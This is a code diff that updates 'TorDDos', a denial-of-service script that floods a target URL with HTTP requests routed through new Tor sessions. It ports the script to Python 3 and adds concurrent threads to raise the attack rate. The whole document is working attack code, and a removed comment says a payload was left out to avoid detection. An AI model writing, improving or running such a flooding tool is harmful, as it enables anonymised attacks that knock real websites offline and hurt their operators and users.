@@ -1,66 +1,103 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# TorDDos (https://www.github.com/R3nt0n/torddos) (14/07/2019)
-# R3nt0n  (https://www.github.com/R3nt0n)
+# TorDDos - Updated 2025
+# Original by R3nt0n (https://www.github.com/R3nt0n)
+# Updated for Python 3 with threading and improved reliability
 
-import datetime
 import sys
+import datetime
+import threading
+import time
 
 from lib.color import color
 from lib.tor import Tor
 
 
-def main():
-    counter = 0
+def attack_worker(tor: Tor, target: str, counter_lock: threading.Lock, counter: list, max_attempts: int) -> None:
+    """Thread worker: creates a new Tor session and fires a single request."""
+    session = tor.new_session()
+    if session is None:
+        return
+
+    with counter_lock:
+        if counter[0] >= max_attempts:
+            return
+        counter[0] += 1
+        current = counter[0]
+
+    print(f'{color.PURPLE}[+]{color.END} [{current}/{max_attempts}] Target: {color.PURPLE}{target}{color.END}')
     try:
-        while counter < max_attempts:
-            tor = Tor()
-            if not tor.tor_installed():
-                print u'{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END)
-                sys.exit(1)
-            else:
-                # Initial timestamp and increment the counter
-                start_time = datetime.datetime.now().time().strftime('%H:%M:%S')
-                counter += 1
+        print(f'{color.ORANGE}[*]{color.END} Getting data from {target}...')
+        response = session.get(target, timeout=15)
+        print(f'{color.GREEN}[*]{color.END} Request #{current} succeeded — '
+              f'Status: {color.GREEN}{response.status_code}{color.END}')
+    except Exception as e:
+        print(f'{color.RED}[!]{color.END} Request #{current} failed: {color.RED}{e}{color.END}')
 
-                # Init a new Tor session
-                session = tor.new_session()
-                print u'{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END)
-                print u'\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END)
 
-                # Getting data from the server
-                print u'{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target)
-                session.get(target)
-                # Putting data (omitted, maybe it makes detection easier)
-                # random_bytes = random._urandom(1490)
-                # print u'{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target)
-                # session.put(target, random_bytes)
-                print u'{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target)
+def main(target: str, max_attempts: int, threads: int) -> None:
+    tor = Tor()
 
-    except KeyboardInterrupt: pass
-    except Exception,exception:
-        print u'\n{}[!]{} An error has occurred:'.format(color.RED, color.END)
-        print u'{}{}{}'.format(color.RED, exception, Exception, color.END)
+    if not tor.tor_installed():
+        print(f'{color.RED}[!]{color.END} Tor is not installed. Please run: sudo apt install tor')
+        sys.exit(1)
+
+    if not tor.tor_started():
+        print(f'{color.YELLOW}[!]{color.END} Tor service is not running. Attempting to start it...')
+        tor.start_tor()
+        time.sleep(5)
+        if not tor.tor_started():
+            print(f'{color.RED}[!]{color.END} Failed to start Tor. Exiting.')
+            sys.exit(1)
+
+    print(f'\n{color.BLUE}[!]{color.END} Starting attack on {color.BLUE}{target}{color.END}')
+    print(f'{color.BLUE}[!]{color.END} Max attempts: {max_attempts} | Threads: {threads}\n')
+
+    start_time = datetime.datetime.now()
+    counter = [0]
+    counter_lock = threading.Lock()
+    active_threads = []
+
+    try:
+        while counter[0] < max_attempts:
+            # Limit active concurrent threads
+            active_threads = [t for t in active_threads if t.is_alive()]
+            if len(active_threads) >= threads:
+                time.sleep(0.5)
+                continue
+
+            t = threading.Thread(
+                target=attack_worker,
+                args=(tor, target, counter_lock, counter, max_attempts),
+                daemon=True
+            )
+            t.start()
+            active_threads.append(t)
+
+        # Wait for all threads to finish
+        for t in active_threads:
+            t.join()
+
+    except KeyboardInterrupt:
+        print(f'\n{color.YELLOW}[!]{color.END} Interrupted by user.')
 
     finally:
-        end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
-        total_time = (datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S'))
-        print u'{}[+]{} Time elapsed:\t{}'.format(color.GREEN, color.END, total_time)
-        print u'{}[+]{} Number of requests:\t{}'.format(color.GREEN, color.END, counter)
-        print u'{}[!]{} Stopping Tor...'.format(color.RED, color.END)
+        end_time = datetime.datetime.now()
+        elapsed = end_time - start_time
+        print(f'\n{color.GREEN}[+]{color.END} Time elapsed:      {elapsed}')
+        print(f'{color.GREEN}[+]{color.END} Requests fired:    {counter[0]}')
+        print(f'{color.RED}[!]{color.END} Stopping Tor...')
         tor.stop_tor()
-        print u'{}[!]{} Exiting...\n'.format(color.RED, color.END)
+        print(f'{color.RED}[!]{color.END} Done. Exiting.\n')
         sys.exit(0)
 
 
 if __name__ == '__main__':
-    # Processing args
-    from lib.args import *
+    from lib.args import parser
     args = parser.parse_args()
-    target = args.target
-    max_attempts = args.max_attempts
-    # Print help and exit when it runs without target arg
-    if not target:
-        parser.print_help(sys.stdout); sys.exit(2)
-    # Run the main execution
-    main()
+
+    if not args.target:
+        parser.print_help(sys.stdout)
+        sys.exit(2)
+
+    main(target=args.target, max_attempts=args.max_attempts, threads=args.threads)
